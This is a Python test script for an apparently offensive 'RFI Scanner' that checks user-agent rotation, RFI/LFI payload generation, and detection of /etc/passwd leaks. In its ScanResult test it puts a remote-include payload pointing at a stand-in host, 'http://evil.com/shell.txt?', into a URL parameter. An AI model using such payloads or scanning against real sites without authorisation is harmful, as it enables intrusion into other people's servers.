#!/usr/bin/env python3
"""
Test script for the Modern RFI Scanner
This script tests the scanner functionality without scanning real targets.
"""

import asyncio
import sys
import os
from modern_rfi_scanner import RFIScanner, PayloadGenerator, UserAgentRotator, ScanResult

async def test_scanner_functionality():
    """Test the scanner's core functionality"""
    print("Testing Modern RFI Scanner functionality...")
    
    # Test 1: User Agent Rotation
    print("\n1. Testing User Agent Rotation:")
    agents = set()
    for _ in range(10):
        agent = UserAgentRotator.get_random_agent()
        agents.add(agent)
        print(f"   Generated: {agent[:50]}...")
    print(f"   Unique agents generated: {len(agents)}")
    
    # Test 2: Payload Generation
    print("\n2. Testing Payload Generation:")
    rfi_payloads = PayloadGenerator.get_rfi_payloads()
    lfi_payloads = PayloadGenerator.get_lfi_payloads()
    print(f"   RFI payloads: {len(rfi_payloads)}")
    print(f"   LFI payloads: {len(lfi_payloads)}")
    print(f"   Sample RFI payload: {rfi_payloads[0]}")
    print(f"   Sample LFI payload: {lfi_payloads[0]}")
    
    # Test 3: Vulnerability Detection
    print("\n3. Testing Vulnerability Detection:")
    
    # Create a mock scanner instance
    scanner = RFIScanner(max_concurrent=5, timeout=5)
    
    # Test vulnerable content
    vulnerable_content = "root:x:0:0:root:/root:/bin/bash\nSafeModeOFF"
    non_vulnerable_content = "Hello World! This is a normal page."
    
    is_vuln1 = scanner._check_vulnerability(vulnerable_content, 200)
    is_vuln2 = scanner._check_vulnerability(non_vulnerable_content, 200)
    
    print(f"   Vulnerable content detected: {is_vuln1}")
    print(f"   Non-vulnerable content detected: {is_vuln2}")
    
    # Test 4: ScanResult Creation
    print("\n4. Testing ScanResult Creation:")
    result = ScanResult(
        url="http://test.com/page.php?id=http://evil.com/shell.txt?",
        vulnerable=True,
        response_code=200,
        response_size=1024,
        payload_used="http://evil.com/shell.txt?",
        response_preview="root:x:0:0:root:/root:/bin/bash...",
        scan_time=1.23
    )
    print(f"   Created ScanResult: {result.url}")
    print(f"   Vulnerable: {result.vulnerable}")
    print(f"   Response Code: {result.response_code}")
    
    print("\n✅ All basic functionality tests passed!")
    return True

def test_file_operations():
    """Test file reading and writing operations"""
    print("\n5. Testing File Operations:")
    
    # Test targets file reading
    try:
        with open('sample_targets.txt', 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        print(f"   Successfully read {len(targets)} targets from sample_targets.txt")
        print(f"   Sample target: {targets[0]}")
    except FileNotFoundError:
        print("   Warning: sample_targets.txt not found")
    
    # Test JSON output creation
    try:
        import json
        test_output = {
            "scan_summary": {
                "total_scanned": 10,
                "vulnerable_found": 2,
                "scan_type": "RFI",
                "timestamp": "2024-01-15 14:30:25"
            },
            "vulnerable_targets": []
        }
        
        with open('test_output.json', 'w') as f:
            json.dump(test_output, f, indent=2)
        print("   Successfully created test JSON output")
        
        # Clean up
        os.remove('test_output.json')
        print("   Cleaned up test file")
        
    except Exception as e:
        print(f"   Error in JSON operations: {e}")
    
    return True

def main():
    """Main test function"""
    print("=" * 60)
    print("Modern RFI Scanner - Test Suite")
    print("=" * 60)
    
    try:
        # Run async tests
        asyncio.run(test_scanner_functionality())
        
        # Run sync tests
        test_file_operations()
        
        print("\n" + "=" * 60)
        print("✅ All tests completed successfully!")
        print("The scanner appears to be working correctly.")
        print("\nTo use the scanner:")
        print("1. Create a targets file with URLs to test")
        print("2. Run: python modern_rfi_scanner.py --targets your_targets.txt --type rfi")
        print("3. Review the results in scan_results.json")
        print("=" * 60)
        
    except Exception as e:
        print(f"\n❌ Test failed with error: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())